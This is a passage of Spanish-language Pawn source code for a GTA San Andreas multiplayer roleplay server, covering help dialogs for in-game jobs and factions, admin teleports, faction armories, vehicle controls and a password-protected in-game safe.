				    AddToBuffer("• Las zonas de color "#CGRIS"GRIS"#CBLANCO", son las zonas que es posible conquistar, y no tienen una pandilla dominante.");
				    AddToBuffer("  Estas, pueden ser conquistadas usando el comando "#CINFO"/conquistar"#CBLANCO", deben haber al menos "#MIN_ATACANTES_GZ" miembros");
				    AddToBuffer("  de la pandilla que ejecutaría la conquista.");
				    AddToBuffer("• Las zonas de otros colores, son zonas que pertenecen ya a una pandilla. Aun así, se le puede robar a una pandilla su zona,");
				    AddToBuffer("  esto se hace asesinando a un pandillero de esa zona, para provocar una "#CROJO"Guerra de bandas.");
				    AddToBuffer("");
				    AddToBuffer("\tNOTA: "#CBLANCO"Este sistema es similar al del "#CVERDE"GTA:SA "#CBLANCO"en su modo SinglePlayer.");
				}
			}
			new
			    tittle[90];

			format(tittle, 90, ""#CBLANCO"Información del servidor "#CINFO"%s", inputtext);
			return Dialog(playerid, dAyuda3, DIALOG_STYLE_MSGBOX, tittle, dialog, "Volver", "Cerrar");
		}
		case dAyuda2:
		{
		    if(!response) return cmd_informacion(playerid, "");

			new
		 		dialog[2000];

			liststr<"Basurero">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Los basureros, se encargan de juntar los desechos, y la basura que los ciudadanos tiran a la calle.");
			    AddToBuffer("Su trabajo, consiste en subirse a un camión, y al llegar a un pote de basura, bajarse del vehículo y utilizar "#CINFO"/limpiar."#CBLANCO"");
			    AddToBuffer("Luego, volver al camión, y conducir hasta el siguiente destino.");
			    AddToBuffer("- Cuando llenen el camión (Cuando la barra de progreso esté llena) deberán ir al basural, y descargar la basura "#CINFO"(/descargar basura)"#CBLANCO".");
			    AddToBuffer("Luego de realizar dicha acción, deberán devolver el camión al basurero.");
			    AddToBuffer(" ");
			    AddToBuffer("• Este trabajo, dispone de dos niveles, la diferencia es que en el segundo nivel tu paga es mayor.");
			    AddToBuffer(" ");
			    AddToBuffer("{FF0000}NOTA: {FFFFFF}La paga varía según el estado del vehículo al devolverlo. ");
			}
			liststr<"diarios">
			{
			    dialog = "{ffffff}";
				AddToBuffer("• Consiste en subirse a una bicicleta, y comenzar a repartir los diarios por las diferentes zonas de Los Santos "#CINFO"(/repartir diarios)"#CBLANCO".");
				AddToBuffer("Al llenar la barra de progreso, deberás devolver la bicicleta, y recibir la paga.");
				AddToBuffer(" ");
				AddToBuffer("\t• Este trabajo, dispone de dos niveles, la diferencia es que en el segundo nivel tu paga es mayor.");
			}
			liststr<"Camionero">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Este trabajo se basa en transportar cargas a diferentes lugares. Te subes al camión de carga, luego debes seleccionar QUE quieres transportar.");
			    AddToBuffer("Una vez hecha la entrega deberás regresar para devolver el camión, y recibir la paga.");
			    AddToBuffer(" ");
			    AddToBuffer("• Este trabajo, dispone de dos niveles:");
			    AddToBuffer("\t- {FF0000}Nivel 1: {FFFFFF}Su sede está en Los Santos, los camiones son relativamente pequeños. Deberás buscar la carga, y transportarla a los locales.");
			    AddToBuffer("\t- {FF0000}Nivel 2: {FFFFFF}Su sede está en la ruta Los Santos-San Fierro. Los camiones son grandes. Deberás subirte a uno, luego se te marcan tres fábricas en ");
			    AddToBuffer("\t  el mapa: Comida, Construcción y Granos. Deberas dirigirte a alguna de esas tres, luego enganchar el acoplado en el camión, y transportarlo ");
				AddToBuffer("\t  para Los Santos, al sindicato de camioneros. Luego de transportar la carga, deberás devolver el camión.");
			    AddToBuffer(" ");
			    AddToBuffer("{FF0000}NOTA: {FFFFFF}La paga varía según el estado del vehículo al devolverlo.");
			}
			liststr<"Cosechador">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Se trata de tomar una máquina, y comenzar a cosechar sobre el terreno indicado. Luego de llenar la barra de progreso, se deberá");
			    AddToBuffer("entregar la cosechadora.");
			    AddToBuffer(" ");
			    AddToBuffer("• Este trabajo, dispone de dos niveles:");
			    AddToBuffer("\t- {FF0000}Nivel 1: {FFFFFF}Podrás cosechar "#CINFO"SOJA"#CBLANCO", en el terreno primario.");
			    AddToBuffer("\t- {FF0000}Nivel 2: {FFFFFF}Podrás cosechar "#CINFO"TRIGO"#CBLANCO", en otro terreno. Paga más que SOJA.");
			}
			liststr<"Ladrón">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Este trabajo, es el único trabajo ilegal momentaneamente. Consiste simplemente, en el rol de un ladrón.");
			    AddToBuffer(" ");
			    AddToBuffer("• Este trabajo, dispone de dos niveles:");
			    AddToBuffer("\t- {FF0000}Nivel 1: {FFFFFF}Podrás robar únicamente NEGOCIOS. En el momento que el vendedor/a te da el dinero, tendrás que entregar las pruebas del robo");
			    AddToBuffer("\t a un lugar aleatorio. Cada vez que un negocio es asaltado, los policias son comunicados de la situación, e inmediatamente se dirigen hacia la zona. Este");
			    AddToBuffer("\t  trabajo requiere ser miembro de una pandilla, o poseer dos estrellas de Rol. Comando: "#CINFO"/robar "#CBLANCO"dentro del negocio, y cerca del vendedor.");
			    AddToBuffer("\t- {FF0000}Nivel 2: {FFFFFF}Ahora podrás robar casas, utilizando diversas herramientas. Deberás decifrar la contraseña de la puerta por medio de");
			    AddToBuffer("\t herramientas. Una vez dentro, podrás robar los muebles de la casa, y luego entregar lo robado para cambiarlo por dinero");
			    AddToBuffer(" ");
			    AddToBuffer("{FF0000}NOTA: {FFFFFF}No se permite que miembros de organizaciones legales se dediquen a robar, es una falta grave de rol.");
			}
			liststr<"pizza">
			{
			    dialog = "{ffffff}";
				AddToBuffer("• En este trabajo deberás llevar la pizza a diferentes casas antes de un determinado tiempo.");
				AddToBuffer("La paga varía según la distancia que tengas que viajar. ");
				AddToBuffer(" ");
				AddToBuffer("Para comenzar a trabajar, debes utilizar "#CINFO"/repartir pizza"#CBLANCO", buscar la pizza, y luego subirte");
				AddToBuffer("a las motos para entregarla. Luego de eso, deberás devolver la moto para recibir el dinero.");
			}
			liststr<"Facciones">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Una facción, es una organización que cumple determinado rol, siempre tienen un rol fundamental en el servidor.");
			    AddToBuffer("En las facciones existen Lideres, y miembros. Dentro de los miembros, existe otra sub-categoría: Los "#CINFO"RANGOS"#CBLANCO".");
			    AddToBuffer(" ");
			    AddToBuffer("• Toda facción tiene:");
			    AddToBuffer("\t• Un CHAT para hablar con los integrantes de la misma: "#CINFO"/fac o /f."#CBLANCO"");
			    AddToBuffer("\t• Un comando para bloquear este chat: "#CINFO"/canal faccion."#CBLANCO"");
			    AddToBuffer("\t• Comandos especiales, para cada una diferentes. Los comandos brindan la posibilidad de realizar correctamente el rol, por ejemplo");
			    AddToBuffer("\t  los Policías tienen comandos para encarcelar a una persona, pero los Reporteros no.");
			    AddToBuffer("\t• Un comando para retirarte voluntariamente de la misma: "#CINFO"/dejar faccion."#CBLANCO"");
			    AddToBuffer("\t• Un comando que permite ver todos los miembros conectados, con su respectivo rango: "#CINFO"/miembros faccion."#CBLANCO"");
				AddToBuffer(" ");
				AddToBuffer(""#CROJO"Lideres: "#CBLANCO"Son los encargados de llevar la facción adelante, son los integrantes más importantes de la facción.");
				AddToBuffer("\t• Pueden invitar un usuario a la facción "#CINFO"(/invitar)"#CBLANCO"");
				AddToBuffer("\t• Pueden Expulsar un usuario de su facción "#CINFO"(/expulsar)"#CBLANCO"");
				AddToBuffer("\t• Pueden cambiarle el rango a un integrante de su facción "#CINFO"(/rango)"#CBLANCO"");
				AddToBuffer("\t• Pueden darle la llave de un vehículo de facción a algún miembro "#CINFO"(/dar llave)"#CBLANCO"");
				AddToBuffer("\t• Pueden retirarle la llave de un vehículo a un miembro "#CINFO"(/quitarllave)");
			}
			liststr<"Poli">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Su rol consiste en mantener el orden jurídico en la ciudad, asi como brindar protección a los ciudadanos.");
			    AddToBuffer("A pesar de que no tengan privilegios, tienen la posibilidad de manipular otros usuarios, ya que tienen acceso ");
			    AddToBuffer("a comandos que permiten realizar acciones por parte de otros, y no de su mismo ID.");
			    AddToBuffer(" ");
			    if(!EsLSPD(playerid))
			    {
			        AddToBuffer(""#CROJO"Solo los miembros o lideres pueden ver los comandos.");
				}
				else
				{
				    AddToBuffer("\t"#CROJO"COMANDOS:"#CBLANCO"");
				    AddToBuffer("/r (Radio) - /dep (Hablar con el departamento de justicia) - /crearcono - /borrarcono (Borra cono más cercano)");
				    AddToBuffer("/acoche (Subir un jugador a un coche) - /scoche (Sacar del coche) - /esposar - /desesposar - /verinv (Ver otro invetario)");
				    AddToBuffer("/verarmas (Ver armas de un jugador) - /cerrarayuntamiento - /abrirayuntamiento - /crearpincharuedas - /borrarpincharuedas");
					AddToBuffer("/m (Hablar con un megáfono) - /arrestar (Encarcelar) - /rastrear (Rastrea una llamada)");
					AddToBuffer("/autorizararmas (Solo líderes, dar licencia de armas) - /refuerzos - /noref - /activartazer (Activa el tazer de tu 9mm) - /desactivartazer ");
					AddToBuffer("/sacarcables (Quitar cables de electricidad) - /revisarcinturon - /placa (Mostrar a alguien tu placa) /remolcar (Con grúa).");
				}
			}
			liststr<"Ejército">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Su rol: Mantener la ciudad protegida de atentados terroristas, o ataques de ciudades externas. Su actividad");
			    AddToBuffer("diaria es entrenar con su lider.");
			    AddToBuffer(" ");
			    if(!EsMilitar(playerid))
			    {
			        AddToBuffer(""#CROJO"Solo los miembros o lideres pueden ver los comandos.");
				}
				else
				{
				    AddToBuffer("\t"#CROJO"COMANDOS:"#CBLANCO"");
				    AddToBuffer("/r (Radio) - /dep (Hablar con el departamento de justicia) - /crearcono - /borrarconos /cerrarayuntamiento - /abrirayuntamiento");
				    AddToBuffer("/acoche (Subir un jugador a un coche) - /scoche (Sacar del coche) /verarmas - /crearpincharuedas - /borrarpincharuedas");
				    AddToBuffer("/m (Hablar con un megáfono) /autorizararmas (Solo líderes, dar licencia de armas) - /refuerzos - /noref - /verinv (Ver otro invetario)");
				}
			}
			liststr<"Hospital">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Su rol: Acudir a los accidentes, mantener el nivel de salúd estable en la ciudad. Ellos pueden curar personas, curar enfermedades.");
			    AddToBuffer(" ");
			    if(!EsMedico(playerid))
			    {
			        AddToBuffer(""#CROJO"Solo los miembros o lideres pueden ver los comandos.");
				}
				else
				{
				    AddToBuffer("\t"#CROJO"COMANDOS:"#CBLANCO"");
				    AddToBuffer("/r (Radio) - /dep (Hablar con el departamento de justicia) - /rastrear (Rastrear una llamada) /acamilla (Subir alguien a la camilla)");
				    AddToBuffer("/aambulancia (Subir alguien a ambulancia) - /sambulancia - /curar - /usar camilla (Tomar una camilla) - /dejar camilla");
				    AddToBuffer("/salvar (Cubre la herida, el paciente deja de perder vida) /placa (Mostrar a alguien tu placa) - /m (Hablar con un megáfono) ");
				}
			}
			liststr<"Televisión">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Un rol que consiste en mantener al día con las noticias de todo tipo a la gente. Poseen un estudio, que les brinda");
			    AddToBuffer("la posibilidad de iniciar un programa de televisión REAL (Cada uno puede verlo tal cual), así como una radio. ");
			    AddToBuffer("• Pueden poner música real, para aumentar el entretenimiento del programa.");
			    AddToBuffer(" ");
			    if(!EsReportero(playerid))
			    {
			        AddToBuffer(""#CROJO"Solo los miembros o lideres pueden ver los comandos.");
				}
				else
				{
				    AddToBuffer("\t"#CROJO"COMANDOS:"#CBLANCO"");
				    AddToBuffer("/iniciar transmision (iniciar programa de radio) - /iniciar programa (Iniciar programa de TV) - /mic (Hablar por micrófono)");
				    AddToBuffer("/finalizar transmision - /finalizar programa - /entrevistar - /ponermusica ");
				}
			}
			liststr<"Mecánicos">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Brindan a la ciudad el simple servicio de mecánicos, ellos podrán reparar tu coche, podran tunearlo.");
			    AddToBuffer("Tienen autorización para remolcar un vehículo mal estacionado, por ejemplo.");
			    AddToBuffer(" ");
			    if(!EsMecanico(playerid))
			    {
			        AddToBuffer(""#CROJO"Solo los miembros o lideres pueden ver los comandos.");
				}
				else
				{
			    	AddToBuffer("\t"#CROJO"COMANDOS:"#CBLANCO"");
			    	AddToBuffer("/modificar (Tunear un auto en el taller) - /remolcar (con grúa) /repararmotor /deposito (estaciona un auto en el depósito)");
				}
			}
			liststr<"Gobierno">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Rol totalmente necesario, el gobierno es quien maneja cantidades enormes de dinero. Cuando compras una propiedad, el dinero va");
			    AddToBuffer("destinado a la caja fuerte de la presidencia. Asi como ganan mucho, diariamente se va una cantidad enorme de dinero: Deben pagarle a ");
			    AddToBuffer("las demás facciones todos los sábados, mantener el orden judicial, pagar los subsidios a la gente, y muchas otras cosas.");
			    AddToBuffer(" ");
			    if(!EsDelGobierno(playerid))
			    {
			        AddToBuffer(""#CROJO"Solo los miembros o lideres pueden ver los comandos.");
				}
				else
				{
				    AddToBuffer("\t"#CROJO"COMANDOS:"#CBLANCO"");
				    AddToBuffer("/r (Radio) - /dep - /pagarfaccion - /gob - /iniciar transmision - /finalizar transmision (Iniciar o finalizar la cadena nacional)");
				}
			}
			liststr<"Sicarios">
			{
			    dialog = "{ffffff}";
			    AddToBuffer("• Su rol no es realmente necesario. Ellos son sicarios, cobran por matar. Son utilizados por las mafias para realizar extorsiones.");
			    AddToBuffer("Disponen de una computadora, que les permite rastrear cualquier persona requiriendo mínimos datos de la misma. Son una de las pocas facciones");
			    AddToBuffer("que puede matar por matar (DM), ya que su rol en la mayoria de las ocaciones lo justifica.");
			    AddToBuffer("Cualquier persona puede solicitar su servicio, solo debes encontrar su sede (Buscarla roleando) y utilizar "#CINFO"/contrato [Víctima] [Dinero].");
			    AddToBuffer(" ");
			    if(ID_Faccion(playerid) != IDHITMAN)
			    {
			        AddToBuffer(""#CROJO"Solo los miembros o lideres pueden ver los comandos.");
				}
				else
				{
				    AddToBuffer("\t"#CROJO"COMANDOS:"#CBLANCO"");
				    AddToBuffer("/contratos (Ver las víctimas y el dinero) - /encontrar (Encontrar una persona, deberás estar en frente de la computadora).");
				}
			}

			new
			    tittle[70];

			format(tittle, 70, ""#CBLANCO"Información del servidor "#CINFO"%s", inputtext);
			return Dialog(playerid, dAyuda3, DIALOG_STYLE_MSGBOX, tittle, dialog, "Volver", "Cerrar");
		}

		case dAyuda3:
		{
	    	return (response) ? cmd_informacion(playerid,"") : _:false;
		}

		case dAdmTeleport:
		{
		    if(!response) return 0;
		    switch(listitem)
		    {
		        case 0: SetPlayerPos(playerid,POS_AYUNTA);
		        case 1: SetPlayerPos(playerid,POS_LSPD);
		        case 2: SetPlayerPos(playerid,POS_GROVE);
		        case 3: SetPlayerPos(playerid,POS_FUERZAAEREA);
		        case 4: SetPlayerPos(playerid,POS_ALCALDE);
		        case 5: SetPlayerPos(playerid,POS_GROTTI);
		        case 6: SetPlayerPos(playerid,POS_YAKUZA);
		        case 7: SetPlayerPos(playerid,POS_LSTV);
		        case 8: SetPlayerPos(playerid,POS_MADDDOG);
		        case 9: SetPlayerPos(playerid,POS_AEROPUERTO);
		        case 10: SetPlayerPos(playerid,POS_SURENOS);
		        case 11: SetPlayerPos(playerid,POS_CLINICA);
		        case 12: SetPlayerPos(playerid,POS_AUTOSUSADOS);
		        case 13: SetPlayerPos(playerid,POS_HOSPITAL);
		        case 14: SetPlayerPos(playerid,POS_AMMUNATION);
		        case 15: SetPlayerPos(playerid,POS_LICENCIAS);
		        case 16: SetPlayerPos(playerid,POS_ALHAMBRA);
		        case 17: SetPlayerPos(playerid,CORDS_DROGA);
		        case 18: SetPlayerPos(playerid,POS_CAMIONEROS);
		        case 19: SetPlayerPos(playerid,POS_REPARTIDORPIZZA);
		        case 20: SetPlayerPos(playerid,POS_REPARTIDORDIARIO);
		        case 21: SetPlayerPos(playerid,POS_BASUREROS);
		        case 22: SetPlayerPos(playerid,POS_COSECHADORES);
			}
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			ShowPlayerDialog(playerid,dAdmTeleport,DIALOG_STYLE_LIST,""#CINFO"Menu de teleport's",MENU_ADMTELEPORT,"Ir","Cancelar");
		}

		case dArmeriaLSEM:
		{
		    if(!response) return false;
	    	ResetPlayerWeapons(playerid);
	    	DarArmaduraPolicia(playerid, 100.0);
		    switch(listitem)
		    {
		        case 0:{ AutoRol(playerid,"se pone el armamento SWAT"); GivePlayerWeapon(playerid,WEAPON_DEAGLE,7*10); GivePlayerWeapon(playerid,WEAPON_M4,50*5); GivePlayerWeapon(playerid,27,80); GivePlayerWeapon(playerid,WEAPON_MP5,30*10); GivePlayerWeapon(playerid,4,1); GivePlayerWeapon(playerid,17,10); }
				case 1:{ AutoRol(playerid,"se pone el armamento civil"); GivePlayerWeapon(playerid,WEAPON_DEAGLE,7*10); }
				case 2:{ AutoRol(playerid,"se pone el armamento guerrillero"); GivePlayerWeapon(playerid,WEAPON_DEAGLE,7*10); GivePlayerWeapon(playerid,WEAPON_MP5,30*10); GivePlayerWeapon(playerid,WEAPON_AK47,50*5); GivePlayerWeapon(playerid,25,50);}
				case 3:{ AutoRol(playerid,"se pone el armamento alcon"); GivePlayerWeapon(playerid,WEAPON_DEAGLE,7*10); GivePlayerWeapon(playerid,WEAPON_AK47,50*5); GivePlayerWeapon(playerid,WEAPON_MP5,30*10); GivePlayerWeapon(playerid,16,10); GivePlayerWeapon(playerid,27,100); GivePlayerWeapon(playerid,46,1); }
				case 4:{ AutoRol(playerid,"se pone el armamento incognito"); GivePlayerWeapon(playerid,WEAPON_SILENCED,14*10); GivePlayerWeapon(playerid,39,10); GivePlayerWeapon(playerid,WEAPON_M4,50*5);  }
				case 5:{ AutoRol(playerid,"se pone el armamento francotirador"); GivePlayerWeapon(playerid,34,30); GivePlayerWeapon(playerid,WEAPON_SILENCED,14*10); GivePlayerWeapon(playerid,4,1); GivePlayerWeapon(playerid,WEAPON_MP5,30*10); }
		    }
		}
		case dRoperoLSEM:
		{
			if(!response) return 0;
			AutoRol(playerid,"se cambia de traje");
			switch(listitem)
			{
			    case 0: ElegirRopa(playerid,287);//militar normal
			    case 1: ElegirRopa(playerid,179);//entrenamiento
			    case 2: ElegirRopa(playerid,191);//Chica
			    case 3: ElegirRopa(playerid,283);//De ceremonia (LVPD)
			    case 4: ElegirRopa(playerid,286);//FBI
			    case 5: ElegirRopa(playerid,208);//Agente 1
			    case 6: ElegirRopa(playerid,165);//Agente 2
			    case 7: ElegirRopa(playerid,166);//Agente 3
			    case 8: ElegirRopa(playerid,285);//Agente SWAT
			    case 9: ElegirRopa(playerid,163);//Seguridad 1
			    case 10: ElegirRopa(playerid,164);//Seguridad
			    case 11: ElegirRopa(playerid,61);//piloto
			}
		}
		case dControlVeh:
		{
		    if(!response) return 0;
  			if(!IsPlayerInAnyVehicle(playerid)) return 0;
	    	new VehID = GetPlayerVehicleID(playerid);
			switch(listitem)
			{
			    case 0:
			    {
			    	if(Veh[VehID][vCerrado])
					{
						AutoRol(playerid,"quita el seguro de las puertas del vehículo");
						AbrirPuertas(VehID);
					}
					else
					{
						AutoRol(playerid,"pone seguro a las puertas del vehículo");
						CerrarPuertas(VehID);
					}
				}
				case 1:
				{
			    	if(Veh[VehID][vCapo])
				    {
				        AutoRol(playerid,"traba el capó del vehículo");
						Veh[VehID][vCapo] = false;
					}
					else
					{
				        AutoRol(playerid,"destraba el capó del vehículo");
						Veh[VehID][vCapo] = true;
					}
				}
				case 2:
				{
			    	if(Veh[VehID][vBaul])
				    {
				        AutoRol(playerid,"traba el maletero del vehículo");
						Veh[VehID][vBaul] = false;
					}
					else
					{
				        AutoRol(playerid,"destraba el maletero del vehículo");
						Veh[VehID][vBaul] = true;
					}
				}
			}
		}
		case dCajaFuerte:
		{
			if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
		        {
		            if(GetPVarInt(playerid,"CajaFuerte") == CF_FACCION)
		            {
						Loop(i,MAX_FACCIONES+1,1)
		                {
		                    if(InfoJugador[playerid][jMiembro] == i || InfoJugador[playerid][jLider] == i)
		                    {
					            new str[55];
					            format(str,sizeof(str),""#CBLANCO"En la caja fuerte hay $%i",InfoFaccion[i][fDinero]);
					            ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
					            AutoRol(playerid,"mira el balance de la caja fuerte");
							}
						}
					}
		            else if(GetPVarInt(playerid,"CajaFuerte") == CF_NEGOCIO)
		            {
    					new str[55];
		            	format(str,sizeof(str),""#CBLANCO"En la caja fuerte hay $%i",InfoNegocio[ID_Negocio(playerid)][nDinero]);
		            	ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
			            AutoRol(playerid,"mira el balance de la caja fuerte");
						return 1;
					}
		            else if(GetPVarInt(playerid,"CajaFuerte") == CF_CASA)
		            {
		            	new str[55];
     					format(str,sizeof(str),""#CBLANCO"En la caja fuerte hay $%i",InfoCasa[ID_Casa(playerid)][cDinero]);
		            	ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
			            AutoRol(playerid,"mira el balance de la caja fuerte");
						return 1;
					}
				}
				case 1:ShowPlayerDialog(playerid,dDepositar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte - "#CINFO"Depositar",""#CBLANCO"Escribe cuanto dinero quieres depositar","Aceptar","Cancelar");
				case 2:ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte - "#CINFO"Retirar",""#CBLANCO"Debes introducir la contraseña para retirar dinero:","Aceptar","Cancelar");
				case 3:ShowPlayerDialog(playerid,dCambiarPassCF,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte - "#CINFO"Cambiar contraseña",""#CBLANCO"Escribe la nueva contraseña de la caja fuerte:","Aceptar","Cancelar");
			}
		}
		case dDepositar:
		{
		    if(!response) return 1;
		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid,dDepositar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"Escribe un valor numérico","Aceptar","Cancelar");
			if(strval(inputtext) < 1) return ShowPlayerDialog(playerid,dDepositar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"Escribe un número positivo","Aceptar","Cancelar");
			if(strval(inputtext) > GetPlayerMoney(playerid)) return Error(playerid,"¡No tienes esa cantidad de dinero!");
			QuitarDinero(playerid,strval(inputtext));
			AutoRol(playerid,"deposita dinero en la caja fuerte");
		    if(GetPVarInt(playerid,"CajaFuerte") == CF_FACCION)
		    {
				Loop(i,MAX_FACCIONES+1,1)
    			{
    				if(InfoJugador[playerid][jMiembro] == i || InfoJugador[playerid][jLider] == i)
    				{
			   			new str[100];
						InfoFaccion[i][fDinero] += strval(inputtext);
			      		format(str,sizeof(str),""#CBLANCO"Depositaste $"#CINFO"%d\n"#CBLANCO"Ahora, en la caja fuerte hay $%i",strval(inputtext),InfoFaccion[i][fDinero]);
				        ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
						ActualizarFacciones();
						A_Format(str, "%s depositó $%d. Hay: [$%d]", pName(playerid), strval(inputtext), InfoFaccion[i][fDinero]);
						new str22[22];
						A_Format(str22, "LOG/CajaFuerte_%d.txt", i);
						Log(str22, str);
					}
				}
			}
   			else if(GetPVarInt(playerid,"CajaFuerte") == CF_NEGOCIO)
   			{
   			    new i = ID_Negocio(playerid);
   				new str[100];
				InfoNegocio[i][nDinero] += strval(inputtext);
    			format(str,sizeof(str),""#CBLANCO"Depositaste $"#CINFO"%d\n"#CBLANCO"Ahora, en la caja fuerte hay $%i",strval(inputtext),InfoNegocio[i][nDinero]);
       			ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
				ActualizarNegocio(i);
				return 1;
			}
   			else if(GetPVarInt(playerid,"CajaFuerte") == CF_CASA)
   			{
   			    new i = ID_Casa(playerid);
   				new str[100];
				InfoCasa[i][cDinero] += strval(inputtext);
    			format(str,sizeof(str),""#CBLANCO"Depositaste $"#CINFO"%d\n"#CBLANCO"Ahora, en la caja fuerte hay $%i",strval(inputtext),InfoCasa[i][cDinero]);
       			ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
   				ActualizarCasa(i);
			  	return 1;
			}
		}
		case dSacar:
		{
  			if(!response) return 1;
		    if(GetPVarInt(playerid,"PuedeSacar") == 1)
			{
			    if(!strval(inputtext)) return ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"Escribe un valor numérico","Aceptar","Cancelar");
				if(strval(inputtext) < 1) return ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"Escribe un número positivo","Aceptar","Cancelar");
			    if(GetPVarInt(playerid,"CajaFuerte") == CF_FACCION)
			    {
					Loop(i,MAX_FACCIONES+1,1)
	    			{
	    				if(InfoJugador[playerid][jMiembro] == i || InfoJugador[playerid][jLider] == i)
	    				{
							if(strval(inputtext) > InfoFaccion[i][fDinero]) return ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"¡En la caja fuerte no hay esa cantidad!","Aceptar","Cancelar");
							InfoFaccion[i][fDinero] -= strval(inputtext);
							GivePlayerMoney(playerid,strval(inputtext));
				   			new str[80];
				      		format(str,sizeof(str),""#CBLANCO"Retiraste $"#CINFO"%d\n"#CBLANCO"Ahora, en la caja fuerte hay $%i",strval(inputtext),InfoFaccion[i][fDinero]);
					        ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
							ActualizarFacciones();
							AutoRol(playerid,"retira dinero en la caja fuerte");
							SetPVarInt(playerid,"PuedeSacar",0);
							A_Format(str, "%s retiró $%d. Hay: [$%d]", pName(playerid), strval(inputtext), InfoFaccion[i][fDinero]);
							new str22[22];
							A_Format(str22, "LOG/CajaFuerte_%d.txt", i);
							Log(str22, str);
						}
					}
				}
			    else if(GetPVarInt(playerid,"CajaFuerte") == CF_NEGOCIO)
			    {
   			    	new i = ID_Negocio(playerid);
					if(strval(inputtext) > InfoNegocio[i][nDinero]) return ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"¡En la caja fuerte no hay esa cantidad!","Aceptar","Cancelar");
					InfoNegocio[i][nDinero] -= strval(inputtext);
					GivePlayerMoney(playerid,strval(inputtext));
	 				new str[80];
	  				format(str,sizeof(str),""#CBLANCO"Retiraste $"#CINFO"%d\n"#CBLANCO"Ahora, en la caja fuerte hay $%i",strval(inputtext),InfoNegocio[i][nDinero]);
	    			ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
					ActualizarNegocio(i);
					AutoRol(playerid,"retira dinero en la caja fuerte");
					SetPVarInt(playerid,"PuedeSacar",0);
				}
			    else if(GetPVarInt(playerid,"CajaFuerte") == CF_CASA)
			    {
   			    	new i = ID_Casa(playerid);
					if(strval(inputtext) > InfoCasa[i][cDinero]) return ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"¡En la caja fuerte no hay esa cantidad!","Aceptar","Cancelar");
					InfoCasa[i][cDinero] -= strval(inputtext);
					GivePlayerMoney(playerid,strval(inputtext));
	 				new str[80];
	  				format(str,sizeof(str),""#CBLANCO"Retiraste $"#CINFO"%d\n"#CBLANCO"Ahora, en la caja fuerte hay $%i",strval(inputtext),InfoCasa[i][cDinero]);
	    			ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Caja fuerte",str,"Cerrar","");
					AutoRol(playerid,"retira dinero en la caja fuerte");
					ActualizarCasa(i);
					SetPVarInt(playerid,"PuedeSacar",0);
				}
			}
		    else if(GetPVarInt(playerid,"PuedeSacar") == 0)
			{
			    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"Introduce alguna contraseña","Aceptar","Cancelar");
			    if(GetPVarInt(playerid,"CajaFuerte") == CF_FACCION)
			    {
					Loop(i,MAX_FACCIONES+1,1)
	    			{
	    				if(InfoJugador[playerid][jMiembro] == i || InfoJugador[playerid][jLider] == i)
	    				{
							if(!strcmp(inputtext,InfoFaccion[i][fContra],false) && strlen(inputtext))
							{
							    SetPVarInt(playerid,"PuedeSacar",1);
							    ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"Escribe la cantidad de dinero a retirar","Retirar","Cancelar");
							}
							else return Error(playerid,"La contraseña es INCORRECTA");
						}
					}
				}
			    else if(GetPVarInt(playerid,"CajaFuerte") == CF_NEGOCIO)
			    {
   			    	new i = ID_Negocio(playerid);
					if(udb_hash(inputtext) == InfoNegocio[i][nContra])
					{
	    				SetPVarInt(playerid,"PuedeSacar",1);
					    ShowPlayerDialog(playerid,dSacar,DIALOG_STYLE_INPUT,""#CINFO"Caja fuerte",""#CBLANCO"Escribe la cantidad de dinero a retirar","Retirar","Cancelar");
					}
					else return Error(playerid,"La contraseña es INCORRECTA");
				}
			    else if(GetPVarInt(playerid,"CajaFuerte") == CF_CASA)
			    {
   			    	new i = ID_Casa(playerid);
					if(udb_hash(inputtext) == InfoCasa[i][cContra])
					{
